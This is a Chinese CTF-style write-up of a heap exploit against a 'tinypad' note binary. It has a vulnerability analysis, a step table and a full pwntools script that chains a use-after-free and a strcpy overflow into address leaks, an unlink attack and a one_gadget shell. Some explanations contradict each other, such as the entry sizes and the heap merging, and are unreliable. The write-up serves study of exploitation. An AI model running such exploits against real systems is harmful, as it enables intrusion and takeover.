# 漏洞利用文档

## 执行环境
- **二进制程序分析**：
  - 64位ELF程序，无PIE（地址空间布局随机化未开启），代码段和数据段地址固定
  - Full RELRO（全局偏移表只读），防止GOT覆盖攻击
  - NX enabled（堆栈不可执行），防止shellcode执行
  - Stack Canary found（栈保护启用），防止栈溢出
  - 依赖libc，通过ldd确认动态链接库
- **运行要求**：
  - Linux环境，需要libc库匹配
  - 使用pwntools进行漏洞利用开发
  - 程序通过标准输入/输出进行交互

## 漏洞成因
- **关键结构体**：
  ```c
  // tinypad全局数组结构，位于数据段0x602040
  struct tinypad_entry {
      int status;           // 使用状态标志
      void *heap_ptr;       // 堆块指针
      size_t size;          // 分配大小
      char *content_ptr;    // 内容指针
  } entries[4];            // 4个索引，每个占用16字节
  ```

- **漏洞分析**：
  - **UAF（Use-After-Free）漏洞**：在`delete`操作中，调用`free`释放堆块后，未将对应的`content_ptr`和`heap_ptr`置空，导致悬垂指针。程序仍可通过这些指针访问已释放的堆内存。
  - **堆溢出漏洞**：在`edit`操作中，使用不安全的`strcpy`函数将内容复制到堆块，没有进行边界检查。特别是第一个小堆块（0x18字节）的编辑操作可能溢出到相邻堆块，覆盖堆元数据。
  - **漏洞触发点**：反编译代码显示，编辑操作中的`strcpy(*(char **)&tinypad[16 * v20 + 248], tinypad)`和删除操作中的指针未清零是主要问题。

## 漏洞利用过程
利用过程通过精心设计的堆操作实现内存控制和代码执行，关键步骤和内存变化如下：

| 步骤 | 操作 | 内存变化 | 利用目的 |
|------|------|----------|----------|
| 1 | 分配3个堆块(0x70,0x70,0x100)，删除索引2和1 | 创建fastbin链表：0x2a659000→0x2a659080→0x0，UAF指针形成 | 设置堆布局，创建UAF条件 |
| 2 | 通过UAF泄露堆地址 | 读取索引1的content_ptr获得fd指针，计算heap_base = 泄露值-0x80 | 获取堆基址，用于后续计算 |
| 3 | 删除索引3 | 堆合并，所有堆块合并为单一top chunk(0x2a659000)，大小0x21001 | 清理堆状态，准备重新布局 |
| 4 | 通过UAF泄露libc地址 | 读取unsorted bin的fd指针，计算main_arena和libc_base | 获取libc基址，计算gadget地址 |
| 5 | 重新分配4个堆块(0x18,0x100,0x100,0x100) | 堆分割：小块(0x2a659000)用于溢出，大块用于存储数据 | 设置堆溢出攻击点 |
| 6 | 在tinypad构造伪造chunk | 地址0x602060处设置伪造chunk：prev_size=0, size=0x101, fd/bk=0x602060 | 准备unlink攻击目标 |
| 7 | 堆溢出调整伪造chunk指针 | 通过edit_ffff覆盖第一个堆块的元数据，尝试修改伪造chunk指针 | 精确控制伪造chunk位置 |
| 8 | 删除索引2 | 触发unlink操作（实际因指针损坏未完全成功） | 尝试获取任意写能力 |
| 9 | 编辑索引4设置伪造元数据 | 覆盖堆块元数据指向main_arena+88 | 准备再次分配时控制指针 |
| 10 | 分配新堆块并写入fake_pad | 写入包含environ指针的payload，准备泄露栈地址 | 获取栈地址以定位返回地址 |
| 11 | 泄露栈地址 | 读取environ指针值，计算main函数返回地址 | 确定ROP攻击目标 |
| 12 | 覆盖返回地址 | 通过编辑操作将返回地址覆盖为one_gadget | 劫持控制流 |
| 13 | 退出main函数 | 触发one_gadget执行execve("/bin/sh") | 获取shell权限 |
| 14 | 交互模式 | 进程替换为/bin/dash，获得完整控制 | 利用完成 |

**关键内存状态转换**：
- 堆布局：从分散块 → 合并top chunk → 重新分割控制
- 地址泄露：堆地址 → libc地址 → 栈地址 → 返回地址
- 控制流：正常执行 → 堆元数据破坏 → 任意写 → 代码执行

## Exploit
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample22')
p = process('./data/sample22')
libc = elf.libc
log.info('PID: ' + str(proc.pidof(p)[0]))
main_arena_offset = 0x3c4b20  # libc中main_arena的固定偏移

def add(size, content):
    p.recvuntil(b'(CMD)>>> ')
    p.sendline(b'a')  # 发送添加命令
    p.recvuntil(b'(SIZE)>>> ')
    p.sendline(str(size).encode())  # 设置堆块大小
    p.recvuntil(b'(CONTENT)>>> ')
    p.sendline(content)  # 写入堆块内容

def edit(idx, content):
    p.recvuntil(b'(CMD)>>> ')
    p.sendline(b'e')  # 发送编辑命令
    p.recvuntil(b'(INDEX)>>> ')
    p.sendline(str(idx).encode())  # 选择编辑索引
    p.recvuntil(b'(CONTENT)>>> ')
    p.sendline(content)  # 写入新内容
    p.recvuntil(b'Is it OK?\n')
    p.sendline(b'Y')  # 确认编辑

def delete(idx):
    p.recvuntil(b'(CMD)>>> ')
    p.sendline(b'd')  # 发送删除命令
    p.recvuntil(b'(INDEX)>>> ')
    p.sendline(str(idx).encode())  # 选择删除索引

def edit_ffff(n, diff):
    for i in range(n + 1):
        data = diff.rjust(0x18 - i, b'f')  # 通过堆溢出精确控制指针值
        edit(1, data)

# 阶段1: 堆布局和信息泄露
p.recvuntil(b'  ============================================================================\n\n')
add(0x70, b'a' * 8)    # 索引1 - 创建第一个fastbin块
add(0x70, b'b' * 8)    # 索引2 - 创建第二个fastbin块  
add(0x100, b'c' * 8)   # 索引3 - 创建大块用于后续操作
delete(2)              # 释放索引2，加入fastbin
delete(1)              # 释放索引1，形成UAF条件

# 阶段2: 堆地址泄露
p.recvuntil(b' # CONTENT: ')
data = p.recvuntil(b'\n', drop=True)
heap_base = u64(data.ljust(8, b'\x00')) - 0x80  # 从泄露的fd指针计算堆基址

# 阶段3: 触发堆合并
delete(3)  # 释放索引3，触发堆合并，清理状态

# 阶段4: libc地址泄露
p.recvuntil(b' # CONTENT: ')
data = p.recvuntil(b'\n', drop=True)
main_arena = u64(data.ljust(8, b'\x00')) - 88  # 从unsorted bin泄露main_arena地址
libc.address = main_arena - main_arena_offset  # 计算libc基址

# 阶段5: 重新布局堆用于溢出攻击
add(0x18, b'a' * 0x18)                    # 索引1 - 小堆块用于堆溢出
add(0x100, b'b' * 0xf8 + b'\x11')         # 索引2 - 设置伪造size字段
add(0x100, b'c' * 0xf8)                   # 索引3 
add(0x100, b'd' * 0xf8)                   # 索引4

# 阶段6: 构造伪造chunk进行unlink攻击
fakechunk_addr = 0x602040 + 0x20         # tinypad中的伪造chunk地址
fakechunk_size = 0x101                   # 伪造chunk大小
fakechunk = p64(0) + p64(fakechunk_size) + p64(fakechunk_addr) + p64(fakechunk_addr)
edit(3, b'd'* 0x20 + fakechunk)          # 在tinypad中布置伪造chunk结构

# 阶段7: 堆溢出精确控制指针
diff = heap_base + 0x20 - fakechunk_addr # 计算需要覆盖的偏移量
diff_strip = p64(diff).strip(b'\0')      # 去除零字节以适应strcpy
number_of_zeros = len(p64(diff)) - len(diff_strip)
edit_ffff(number_of_zeros, diff_strip)   # 通过堆溢出调整伪造chunk指针

# 阶段8: 触发unlink攻击
delete(2)                                # 删除操作触发unlink
p.recvuntil(b'\nDeleted.')

# 阶段9: 设置伪造的堆块元数据
edit(4, b'd' * 0x20 + p64(0) + p64(0x101) + p64(main_arena + 88) + p64(main_arena + 88))

# 阶段10: 泄露栈地址准备
one_gadget_addr = libc.address + 0x45226  # 计算one_gadget地址
environ_pointer = libc.symbols['__environ']  # 获取environ指针地址
# 构造fake_pad包含environ指针和tinypad地址
fake_pad = b'f' * (0x100 - 0x20 - 0x10) + b'a' * 8 + p64(environ_pointer) + b'a' * 8 + p64(0x602148)
add(0x100 - 8, fake_pad)  # 分配新堆块并写入payload

# 阶段11: 泄露栈地址计算返回地址
p.recvuntil(b' # CONTENT: ')
environ_addr = p.recvuntil(b'\n', drop=True).ljust(8, b'\x00')
environ_addr = u64(environ_addr)          # 获取实际的栈地址
main_ret_addr = environ_addr - 30 * 8     # 计算main函数返回地址

# 阶段12: 覆盖返回地址实现代码执行
edit(2, p64(main_ret_addr))               # 将指针指向返回地址位置
edit(1, p64(one_gadget_addr))             # 覆盖返回地址为one_gadget

# 阶段13: 触发漏洞执行
p.recvuntil(b'(CMD)>>> ')
p.sendline(b'Q')  # 退出main函数，触发one_gadget

# 阶段14: 获得shell控制
p.interactive()  # 进入交互模式，获得shell权限
```

**漏洞利用关键技术**：
1. **UAF利用**：通过悬垂指针泄露关键地址信息
2. **堆风水**：精确控制堆布局实现元数据覆盖
3. **unlink攻击**：通过伪造chunk实现任意写（虽然部分失败但为后续利用铺路）
4. **ROP链构建**：结合libc地址和栈地址精确覆盖返回地址
5. **one_gadget使用**：直接跳转到libc中的execve调用点

该漏洞利用成功演示了如何通过组合UAF和堆溢出漏洞，从内存泄露到最终代码执行的完整攻击链。
